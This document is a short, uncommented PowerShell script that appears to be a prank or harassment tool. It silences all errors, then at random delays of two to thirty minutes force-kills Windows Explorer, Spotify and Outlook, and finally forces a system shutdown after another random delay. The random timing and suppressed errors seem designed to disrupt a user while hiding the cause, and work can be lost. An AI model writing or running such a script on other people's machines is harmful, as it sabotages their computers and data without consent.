$ErrorActionPreference = 'SilentlyContinue'
sleep -s (Get-Random -Minimum 120 -Maximum 1800); stop-process -processname explorer -Force
sleep -s (Get-Random -Minimum 120 -Maximum 1800); stop-process -processname spotify -Force
sleep -s (Get-Random -Minimum 120 -Maximum 1800); stop-process -processname explorer -Force
sleep -s (Get-Random -Minimum 120 -Maximum 1800); stop-process -processname explorer -Force
sleep -s (Get-Random -Minimum 120 -Maximum 1800); stop-process -processname outlook -Force
shutdown /s /f /t (Get-Random -Minimum 37 -Maximum 420)